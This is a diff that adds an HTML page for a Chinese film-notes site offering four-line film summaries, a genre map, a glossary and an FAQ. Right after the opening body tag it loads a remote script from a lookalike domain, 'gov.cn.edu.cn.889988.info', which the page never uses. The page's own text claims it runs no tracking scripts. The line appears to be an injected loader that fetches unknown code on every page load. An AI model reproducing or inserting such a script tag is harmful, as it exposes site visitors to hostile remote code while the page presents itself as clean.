@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>小影影视　映画手札 · 一页看完类型、档期与看点 —— xiaoyingyingshi-zh.github.io</title>
+<meta name="description" content="小影影视是一份慢慢写的映画手札：每部片子只留类型、时长、档期、看点四行，配一句不剧透的判断。来 xiaoyingyingshi-zh.github.io 翻类型谱系、找冷门片、学会在开播前三分钟决定看不看。">
+<meta name="keywords" content="小影影视, xiaoyingyingshi-zh.github.io, 映画手札, 类型片看点, 影片短评, 不剧透选片, 冷门佳作, 档期速查, 剧集入坑判断">
+<meta name="author" content="小影影视">
+<link rel="canonical" href="https://xiaoyingyingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="小影影视　映画手札 —— xiaoyingyingshi-zh.github.io">
+<meta property="og:description" content="一部片四行看完：类型、时长、档期、看点。小影影视只写不剧透的判断。">
+<meta property="og:url" content="https://xiaoyingyingshi-zh.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="小影影视 · 映画手札">
+<meta name="twitter:description" content="类型、时长、档期、看点，四行决定今晚看哪部。">
+<style>
+:root{
+  --ink:#1b1c1a;
+  --ink2:#3d3e3a;
+  --paper:#f1ece0;
+  --paper2:#e6dfcd;
+  --seal:#9e2b25;
+  --seal2:#c0433c;
+  --wash:#6b7a6f;
+  --line:#cdc3ad;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","STSong","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.85;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:
+    radial-gradient(circle at 12% 18%,rgba(158,43,37,.05),transparent 42%),
+    radial-gradient(circle at 88% 82%,rgba(107,122,111,.10),transparent 40%),
+    repeating-linear-gradient(0deg,rgba(120,110,90,.035) 0 1px,transparent 1px 4px);
+}
+.wrap{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:0 22px}
+
+/* 顶部落款 */
+.mast{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;padding:30px 0 14px;border-bottom:3px double var(--ink);flex-wrap:wrap}
+.mast .seal{flex:1 1 320px}
+.mast .seal b{display:block;font-size:clamp(30px,6.4vw,52px);letter-spacing:.34em;font-weight:700;line-height:.95;padding-left:.18em}
+.mast .seal span{display:block;margin-top:10px;font-size:12.5px;letter-spacing:.28em;color:var(--wash);font-family:Georgia,serif}
+.mast .stamp{width:74px;height:74px;border:2.5px solid var(--seal);color:var(--seal);border-radius:50%;display:flex;align-items:center;justify-content:center;text-align:center;font-size:12px;line-height:1.25;letter-spacing:.1em;transform:rotate(-9deg);flex:none}
+.mast .stamp i{font-style:normal}
+
+/* 卷首语 */
+.lead{padding:26px 0 34px;display:grid;grid-template-columns:1fr 1.35fr;gap:34px;align-items:end}
+.lead h2{font-size:clamp(19px,3.2vw,26px);font-weight:500;line-height:1.6;letter-spacing:.06em}
+.lead h2 em{font-style:normal;color:var(--seal);border-bottom:2px solid var(--seal2)}
+.lead p{font-size:14.5px;color:var(--ink2);border-left:2px solid var(--line);padding-left:16px}
+.lead p b{color:var(--ink);font-weight:600}
+.urlbar{margin-top:16px;background:#161713;color:#dfe3d6;font-family:"SF Mono",Menlo,Consolas,monospace;font-size:12.5px;padding:9px 14px;border-radius:3px;letter-spacing:.04em;overflow-wrap:anywhere}
+.urlbar i{font-style:normal;color:#8fa892}
+
+/* 刻度导航 */
+nav.gauge{position:sticky;top:0;z-index:50;background:rgba(241,236,224,.94);backdrop-filter:blur(6px);border-bottom:1px solid var(--line)}
+nav.gauge .wrap{padding:0 22px}
+.ruler{display:flex;gap:0;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.ruler::-webkit-scrollbar{display:none}
+.ruler a{flex:none;padding:13px 15px 11px;font-size:13px;letter-spacing:.14em;color:var(--ink2);text-decoration:none;border-bottom:3px solid transparent;white-space:nowrap}
+.ruler a:hover,.ruler a.on{color:var(--seal);border-bottom-color:var(--seal)}
+.ruler a small{display:block;font-size:9.5px;letter-spacing:.06em;color:var(--wash);font-family:Georgia,serif}
+
+/* 栏目 */
+section{padding:60px 0 26px;scroll-margin-top:66px}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head .no{font-family:Georgia,serif;font-size:13px;color:var(--seal);letter-spacing:.1em;border:1px solid var(--seal);padding:2px 8px;border-radius:2px}
+.sec-head h3{font-size:clamp(21px,3.6vw,29px);letter-spacing:.2em;font-weight:600}
+.sec-head .rule{flex:1 1 120px;height:1px;background:linear-gradient(90deg,var(--line),transparent)}
+.sec-head .en{font-family:Georgia,serif;font-size:11.5px;color:var(--wash);letter-spacing:.2em;text-transform:uppercase}
+
+/* 索引卡 */
+.grid{display:grid;gap:20px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+.card{background:#f7f3e8;border:1px solid var(--line);padding:20px 18px 16px;position:relative;transition:.25s}
+.card::after{content:"";position:absolute;right:-1px;bottom:-1px;width:22px;height:22px;background:linear-gradient(135deg,transparent 50%,var(--paper2) 50%,var(--paper2) 52%,var(--line) 52%,transparent 54%);border-left:1px solid var(--line);border-top:1px solid var(--line)}
+.card .k{font-family:Georgia,serif;font-size:11px;color:var(--seal);letter-spacing:.18em;margin-bottom:8px}
+.card h4{font-size:17px;letter-spacing:.1em;font-weight:600;margin-bottom:8px}
+.card p{font-size:13.5px;color:var(--ink2);line-height:1.75}
+.card:hover{background:#fffdf6;transform:translateY(-3px)}
+.card .tag{display:inline-block;margin-top:12px;font-size:11px;letter-spacing:.1em;color:var(--wash);border:1px solid var(--line);padding:1px 7px}
+
+/* 放映带 */
+.reel{overflow-x:auto;scrollbar-width:thin;scrollbar-color:var(--line) transparent;padding-bottom:8px}
+.reel-in{display:flex;gap:16px;width:max-content;min-width:100%}
+.reel-in .card{min-width:250px;max-width:290px;flex:none}
+.reel-in .card .meta{font-family:Georgia,serif;font-size:11.5px;color:var(--seal);letter-spacing:.08em;margin-bottom:6px}
+.reel-in .card .stars{color:#b8913a;letter-spacing:.1em;font-size:12px;margin-top:10px}
+
+/* 谱表 */
+.spectrum{display:grid;grid-template-columns:120px 1fr;gap:0;border-top:1px solid var(--line)}
+.spectrum div{padding:13px 14px;border-bottom:1px solid var(--line);font-size:13.5px}
+.spectrum .lab{background:#ece5d4;font-family:Georgia,serif;font-size:12px;letter-spacing:.1em;color:var(--ink2);display:flex;align-items:center}
+.spectrum .txt b{color:var(--seal);font-weight:600}
+.spectrum .txt span{color:var(--wash);font-size:12px;margin-left:8px;letter-spacing:.06em}
+
+/* 四步 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line);background:#f7f3e8}
+.steps .st{border-right:1px solid var(--line);padding:20px 18px;counter-increment:none}
+.steps .st:last-child{border-right:none}
+.steps .st b{display:block;font-family:Georgia,serif;font-size:22px;color:var(--seal);line-height:1;margin-bottom:9px}
+.steps .st h5{font-size:15px;letter-spacing:.12em;margin-bottom:7px;font-weight:600}
+.steps .st p{font-size:12.8px;color:var(--ink2);line-height:1.7}
+
+/* 问答 */
+details.faq{background:#f7f3e8;border:1px solid var(--line);margin-bottom:10px;padding:0 18px}
+details.faq[open]{background:#fffdf6}
+details.faq summary{cursor:pointer;padding:15px 0;font-size:15px;letter-spacing:.06em;font-weight:600;list-style:none;display:flex;justify-content:space-between;gap:14px}
+details.faq summary::-webkit-details-marker{display:none}
+details.faq summary::after{content:"＋";color:var(--seal);font-weight:400;font-size:17px;flex:none}
+details.faq[open] summary::after{content:"－"}
+details.faq .body{padding:0 0 16px;font-size:13.6px;color:var(--ink2);line-height:1.85;border-top:1px dashed var(--line);margin-top:-2px;padding-top:14px}
+details.faq .body a{color:var(--seal);text-decoration:underline;text-decoration-color:var(--seal2);text-underline-offset:3px;overflow-wrap:anywhere}
+
+/* 术语 */
+.gloss{column-count:2;column-gap:30px;column-rule:1px solid var(--line);font-size:13.4px}
+.gloss dl{break-inside:avoid;margin-bottom:14px}
+.gloss dt{font-weight:600;letter-spacing:.06em;color:var(--ink)}
+.gloss dt i{font-style:normal;color:var(--seal);font-family:Georgia,serif;font-size:11px;margin-right:6px}
+.gloss dd{color:var(--ink2);line-height:1.7;margin-top:2px}
+
+/* 清单 */
+.check{background:#f7f3e8;border:1px solid var(--line);padding:22px 24px}
+.check label{display:flex;gap:13px;align-items:flex-start;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px;cursor:pointer}
+.check label:last-child{border-bottom:none}
+.check input{appearance:none;width:17px;height:17px;border:1.5px solid var(--seal);border-radius:2px;margin-top:5px;flex:none;position:relative;cursor:pointer}
+.check input:checked{background:var(--seal)}
+.check input:checked::after{content:"✓";position:absolute;inset:0;color:#f7f3e8;font-size:12px;line-height:15px;text-align:center}
+.check .who{font-family:Georgia,serif;font-size:11.5px;color:var(--wash);letter-spacing:.08em;margin-left:auto;white-space:nowrap}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.1fr .9fr;gap:30px;align-items:start}
+.note{background:#161713;color:#dfe3d6;padding:24px 22px;font-family:"SF Mono",Menlo,Consolas,monospace;font-size:12.4px;line-height:1.9;letter-spacing:.02em}
+.note b{color:#e0b98a;font-weight:500}
+.note u{text-decoration:none;border-bottom:1px solid #6f7a6a;color:#dfe3d6}
+.about .txt{font-size:14px;color:var(--ink2)}
+.about .txt p{margin-bottom:14px}
+.about .txt .sign{font-family:Georgia,serif;color:var(--seal);letter-spacing:.16em;font-size:13px}
+
+footer{border-top:3px double var(--ink);margin-top:56px;padding:28px 0 40px;font-size:12.5px;color:var(--wash);line-height:1.9}
+footer .row{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap}
+footer a{color:var(--ink2);text-decoration:none;border-bottom:1px solid var(--line)}
+footer .disc{margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-size:11.8px}
+
+/* 移动 */
+@media(max-width:760px){
+  .wrap{padding:0 16px}
+  nav.gauge .wrap{padding:0 16px}
+  .lead{grid-template-columns:1fr;gap:18px;padding:20px 0 26px}
+  .g4,.g3,.g2{grid-template-columns:1fr}
+  .steps{grid-template-columns:1fr;border:none}
+  .steps .st{border-right:none;border:1px solid var(--line);border-bottom:none}
+  .steps .st:last-child{border-bottom:1px solid var(--line)}
+  .spectrum{grid-template-columns:1fr}
+  .spectrum .lab{border-bottom:none;padding-bottom:4px;background:none;padding-top:14px}
+  .spectrum .txt{border-bottom:1px solid var(--line);padding-top:0;padding-bottom:14px}
+  .gloss{column-count:1}
+  .about{grid-template-columns:1fr}
+  .mast .seal b{letter-spacing:.26em}
+  .check .who{margin-left:0;width:100%}
+}
+@media print{
+  nav.gauge,.ruler{display:none}
+  body{background:#fff}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div class="wrap">
+
+  <header class="mast">
+    <div class="seal">
+      <b>小影影视</b>
+      <span>映 画 手 札 · 卷 一 · 庚 子 后 第 六 载</span>
+    </div>
+    <div class="stamp"><i>小影<br>影视<br>之印</i></div>
+  </header>
+
+  <div class="lead">
+    <h2>一部片子，<em>四行</em>就够决定今晚看不看。</h2>
+    <div>
+      <p>小影影视不堆片库数字，也不替你按下播放键。我们只把每部作品压成<b>类型、时长、档期、看点</b>四行字，再补一句不剧透的判断——三分钟读完，剩下的交给你的口味。</p>
+      <div class="urlbar"><i>↳</i> https://xiaoyingyingshi-zh.github.io/ <i>· 本页唯一地址</i></div>
+    </div>
+  </div>
+</div>
+
+<nav class="gauge" id="top">
+  <div class="wrap">
+    <div class="ruler">
+      <a href="#file" class="on"><small>壹</small>档案四行</a>
+      <a href="#reel"><small>贰</small>本月放映带</a>
+      <a href="#type"><small>叁</small>类型谱</a>
+      <a href="#how"><small>肆</small>挑片四步</a>
+      <a href="#faq"><small>伍</small>常见疑问</a>
+      <a href="#glossary"><small>陆</small>片场小词</a>
+      <a href="#check"><small>柒</small>开看清单</a>
+      <a href="#about"><small>捌</small>关于手札</a>
+    </div>
+  </div>
+</nav>
+
+<div class="wrap">
+
+  <section id="file">
+    <div class="sec-head">
+      <span class="no">壹</span><h3>档案四行</h3><span class="rule"></span><span class="en">The Four Lines</span>
+    </div>
+    <div class="grid g4">
+      <article class="card">
+        <div class="k">LINE 01</div>
+        <h4>类型</h4>
+        <p>主类型挂一头，副调缀在括号里。悬疑（心理惊悚）和悬疑（本格推理）是两种病，吃同一种药不管用。</p>
+        <span class="tag">先定情绪，再定片</span>
+      </article>
+      <article class="card">
+        <div class="k">LINE 02</div>
+        <h4>时长</h4>
+        <p>90 分钟是约会，130 分钟是过夜，240 分钟是赌上整个周末。时长写在最前，是对时间的诚实。</p>
+        <span class="tag">通勤 / 睡前 / 长假</span>
+      </article>
+      <article class="card">
+        <div class="k">LINE 03</div>
+        <h4>档期</h4>
+        <p>上映、定档、上线流媒的日期都记一笔。追剧的人看周更节奏，囤片的人看是否已完结。</p>
+        <span class="flag">完结 / 连载 / 待定</span>
+      </article>
+      <article class="card">
+        <div class="k">LINE 04</div>
+        <h4>看点</h4>
+        <p>只写能被证实的东西：摄影、配乐、表演、结构。不写“全程高能”，那句话已经害过太多人。</p>
+        <span class="tag">一句，不剧透</span>
+      </article>
+    </div>
+  </section>
+
+  <section id="reel">
+    <div class="sec-head">
+      <span class="no">贰</span><h3>本月放映带</h3><span class="rule"></span><span class="en">Now on the Reel</span>
+    </div>
+    <div class="reel">
+      <div class="reel-in">
+        <article class="card">
+          <div class="meta">NO.037 · 剧情 / 家庭</div>
+          <h4>秋后的一扇门</h4>
+          <p>132 分钟。用一场饭桌戏撑起二十年，对白少得让人坐不住，表演全在夹菜的手上。</p>
+          <div class="stars">★ ★ ★ ★ ☆　<span>适合：周末独看</span></div>
+        </article>
+        <article class="card">
+          <div class="meta">NO.038 · 悬疑 / 社会</div>
+          <h4>第七次晨报</h4>
+          <p>108 分钟。每十分钟推翻一次前提，第二遍看会多出三条线索，结局不靠反转靠回甘。</p>
+          <div class="stars">★ ★ ★ ★ ☆　<span>适合：二刷党</span></div>
+        </article>
+        <article class="card">
+          <div class="meta">NO.039 · 动画 / 奇幻</div>
+          <h4>纸船往北</h4>
+          <p>96 分钟。手绘质感压过设定，配乐用一把冬不拉，孩子看画面，大人看那场送别。</p>
+          <div class="stars">★ ★ ★ ★ ★　<span>适合：带家人</span></div>
+        </article>
+        <article class="card">
+          <div class="meta">NO.040 · 纪录片</div>
+          <h4>海边修表的人</h4>
+          <p>74 分钟。没有旁白，只有潮汐和拆开的齿轮声。看完会想给谁打个电话。</p>
+          <div class="stars">★ ★ ★ ★ ☆　<span>适合：睡前降噪</span></div>
+        </article>
+        <article class="card">
+          <div class="meta">NO.041 · 喜剧 / 轻犯罪</div>
+          <h4>笨贼的星期天</h4>
+          <p>88 分钟。节奏像老式连坏片，笑点不靠吐槽，靠三个倒霉蛋互相拆台。</p>
+          <div class="stars">★ ★ ★ ☆ ☆　<span>适合：下饭</span></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="type">
+    <div class="sec-head">
+      <span class="no">叁</span><h3>类型谱</h3><span class="rule"></span><span class="en">Genre Map</span>
+    </div>
+    <div class="spectrum">
+      <div class="lab">剧情 · 生活</div>
+      <div class="txt"><b>要的是余味</b><span>｜看表演密度，别看情节密度</span></div>
+      <div class="lab">悬疑 · 推理</div>
+      <div class="txt"><b>要的是公平</b><span>｜线索提前给过，才算漂亮</span></div>
+      <div class="lab">喜剧 · 轻喜</div>
+      <div class="txt"><b>要的是松</b><span>｜能暂停吃饭不丢线，才是好喜剧</span></div>
+      <div class="lab">动作 · 犯罪</div>
+      <div class="txt"><b>要的是准</b><span>｜打戏有代价，车戏有地形</span></div>
+      <div class="lab">动画 · 奇幻</div>
+      <div class="txt"><b>要的是胆</b><span>｜设定越疯，情感越得老实</span></div>
+      <div class="lab">纪录 · 真实</div>
+      <div class="txt"><b>要的是耐心</b><span>｜没有配乐时，比有配乐更响</span></div>
+      <div class="lab">剧集 · 长线</div>
+      <div class="txt"><b>要的是收</b><span>｜先看结局口碑，再决定入坑</span></div>
+    </div>
+  </section>
+
+  <section id="how">
+    <div class="sec-head">
+      <span class="no">肆</span><h3>挑片四步</h3><span class="rule"></span><span class="en">How We Pick</span>
+    </div>
+    <div class="steps">
+      <div class="st"><b>01</b><h5>定今晚的力气</h5><p>只剩二十分钟脑子，就别点开三季铺垫的史诗。先承认自己累，片才选得对。</p></div>
+      <div class="st"><b>02</b><h5>翻四行档案</h5><p>类型定情绪，时长定预算，档期定能不能连看，看点定要不要二刷。</p></div>
+      <div class="st"><b>03</b><h5>试三分钟</h5><p>开头三分钟不骗人：色调、语速、配乐品位，三样够了就继续。</p></div>
+      <div class="st"><b>04</b><h5>写回一句</h5><p>看完只留一句话给自己。攒够三十句，你就有了专属的选片口味表。</p></div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="sec-head">
+      <span class="no">伍</span><h3>常见疑问</h3><span class="rule"></span><span class="en">Notes &amp; Queries</span>
+    </div>
+    <details class="faq" open>
+      <summary>小影影视能直接在这里看片子吗？</summary>
+      <div class="body">不能，也不打算能。小影影视只做影片档案、类型梳理和观前判断，不提供播放源、不挂下载、不跳转盗链。我们把力气花在「该不该看」上，点开播放交给你自己常用的正版渠道。</div>
+    </details>
+    <details class="faq">
+      <summary>这里的评分是怎么来的？</summary>
+      <div class="body">是编辑看完后按四档给的口味标记，不是算法均值，也不和任何平台分数对齐。它只回答一个问题：这片适不适合在这个时刻的你。</div>
+    </details>
+    <details class="faq">
+      <summary>片单多久更新一回？</summary>
+      <div class="body">每月换一版放映带，档案库里的四行信息随定档、上线、完结随时改。连载中的剧只看已出部分，不提前替结局打分。</div>
+    </details>
+    <details class="faq">
+      <summary>为什么总强调「不剧透」？</summary>
+      <div class="body">一部片的第二遍才属于结构，第一遍属于你自己。我们把转折、身份、结局都留在画面里，写看点只写开场就能看见的东西。</div>
+    </details>
+    <details class="faq">
+      <summary>想找某一部，这里怎么查？</summary>
+      <div class="body">本页是单页手札，用浏览器自带的 Ctrl / ⌘ + F 搜片名最快。也欢迎在 <a href="#about">关于本站</a> 的地址栏留下你想被收录的片子，写明类型与年份就够了。</div>
+    </details>
+    <details class="faq">
+      <summary>唯一的正式地址是哪个？</summary>
+      <div class="body">只有这一个：<a href="https://xiaoyingyingshi-zh.github.io/">https://xiaoyingyingshi-zh.github.io/</a>。遇到长得像的镜像站，不是我们。</div>
+    </details>
+  </section>
+
+  <section id="glossary">
+    <div class="sec-head">
+      <span class="no">陆</span><h3>片场小词</h3><span class="rule"></span><span class="en">A Small Lexicon</span>
+    </div>
+    <div class="gloss">
+      <dl><dt><i>01</i>长镜头</dt><dd>一场戏不切，靠走位和调度把时间留在画里，憋得住才是功力。</dd></dl>
+      <dl><dt><i>02</i>蒙太奇</dt><dd>把不挨着的两件事并排放，意思从缝里长出来。</dd></dl>
+      <dl><dt><i>03</i>定场镜头</dt><dd>开场那一下交代地点与气候，聪明的一镜能省三句对白。</dd></dl>
+      <dl><dt><i>04</i>过场戏</dt><dd>最容易被删、也最决定人物是不是活人的那些戏。</dd></dl>
+      <dl><dt><i>05</i>声桥</dt><dd>画面还没切，声音先过去，观众的耳朵替眼睛走了一步。</dd></dl>
+      <dl><dt><i>06</i>留白</dt><dd>不演出来的那半句，通常才是全片最响的地方。</dd></dl>
+      <dl><dt><i>07</i>弧光</dt><dd>人物一趟旅程下来的变化轨迹，有没有弧光，一眼骗不了人。</dd></dl>
+      <dl><dt><i>08</i>节奏点</dt><dd>爆点之间的呼吸长度；太密会麻，太疏会走神。</dd></dl>
+      <dl><dt><i>09</i>视点镜头</dt><dd>让你临时站到他眼睛后面看一眼，共情就是这么偷来的。</dd></dl>
+      <dl><dt><i>10</i>冷开场</dt><dd>主角还没出场，世界已经先转了半圈。</dd></dl>
+      <dl><dt><i>11</i>收线</dt><dd>前面随手埋的一句闲话，结尾被捡回来，观众会起鸡皮疙瘩。</dd></dl>
+      <dl><dt><i>12</i>调色倾向</dt><dd>青灰是克制，暖黄是念旧，高饱和多半在哄你高兴。</dd></dl>
+      <dl><dt><i>13</i>同期声</dt><dd>现场原声被留住，房间才有了厚度，后期配乐反而得让位。</dd></dl>
+      <dl><dt><i>14</i>反派视角</dt><dd>给坏人一场自己的戏，片子立刻从二元变成立体。</dd></dl>
+      <dl><dt><i>15</i>余帧</dt><dd>字幕都起了还不肯黑的最后一两秒，是导演留给你的椅子。</dd></dl>
+    </div>
+  </section>
+
+  <section id="check">
+    <div class="sec-head">
+      <span class="no">柒</span><h3>开看清单</h3><span class="rule"></span><span class="en">Tonight’s Shortlist</span>
+    </div>
+    <div class="check">
+      <label><input type="checkbox" /><span>先定：今晚是放松、被戳，还是想被烧脑？</span><em class="who">STEP 01</em></label>
+      <label><input type="checkbox" /><span>看时长——通勤选 90 内，周末才敢开长篇。</span><em class="who">STEP 02</em></label>
+      <label><input type="checkbox" /><span>翻类型谱，确认自己受得了这种情绪。</span><em class="who">STEP 03</em></label>
+      <label><input type="checkbox" /><span>试开头三分钟：色调、语速、配乐，三项过关就留。</span><em class="who">STEP 04</em></label>
+      <label><input type="checkbox" /><span>剧集先看是否完结，别在悬空处过夜。</span><em class="who">STEP 05</em></label>
+      <label><input type="checkbox" /><span>看完写一句话给自己，攒成私人口味表。</span><em class="who">STEP 06</em></label>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="sec-head">
+      <span class="no">捌</span><h3>关于手札</h3><span class="rule"></span><span class="en">Colophon</span>
+    </div>
+    <div class="about">
+      <div class="txt">
+        <p>小影影视起手只是一个很朴素的念头：片荒的时候，人缺的不是更多推荐，而是<b>一小段能被自己判断的判断</b>。于是我们把每部片子压成四行，把类型拆成一张谱，把挑片写成四步，剩下的交给你的眼睛。</p>
+        <p>这里没有播放按钮，没有弹窗，没有追踪你看过什么的脚本。页面是一张纸，刷新之后它还是那张纸。你在 <b>小影影视</b> 花的三分钟，应该用来决定要不要再花九十分钟。</p>
+        <p class="sign">— 小影影视 · 卷一终 —</p>
+      </div>
+      <div class="note">
+<b>canonical</b>  https://xiaoyingyingshi-zh.github.io/<br>
+<b>scope</b>      影片档案 · 类型梳理 · 观前判断<br>
+<b>update</b>     每月一版放映带<br>
+<b>policy</b>     不提供播放源 / 下载 / 盗链<br>
+<b>contact</b>    本页唯一入口，见上方地址栏<br>
+<br>
+<u>小影影视</u>　xiaoyingyingshi-zh.github.io<br>
+纸墨之间，只剩片子本身。
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="row">
+      <div>© 小影影视 · 映画手札　|　本页收录地址：<a href="https://xiaoyingyingshi-zh.github.io/">https://xiaoyingyingshi-zh.github.io/</a></div>
+      <div><a href="#top">回到卷首 ↑</a></div>
+    </div>
+    <div class="disc">
+      小影影视为个人影视资料与观前参考手札，所涉片名为作品指称之用，版权归属各自权利人。本站不含任何在线播放、下载与资源分发功能，亦不采集访客行为数据。唯一正式站点：https://xiaoyingyingshi-zh.github.io/，请认准此地址。
+    </div>
+  </footer>
+</div>
+
+<script>
+(function(){
+  var links=[].slice.call(document.querySelectorAll('.ruler a'));
+  var secs=links.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});
+  function tick(){
+    var y=window.scrollY+120,cur=0;
+    secs.forEach(function(s,i){ if(s&&s.offsetTop<=y) cur=i; });
+    links.forEach(function(a,i){ a.classList.toggle('on',i===cur); });
+  }
+  window.addEventListener('scroll',tick,{passive:true}); tick();
+})();
+</script>
+</body>
+</html>
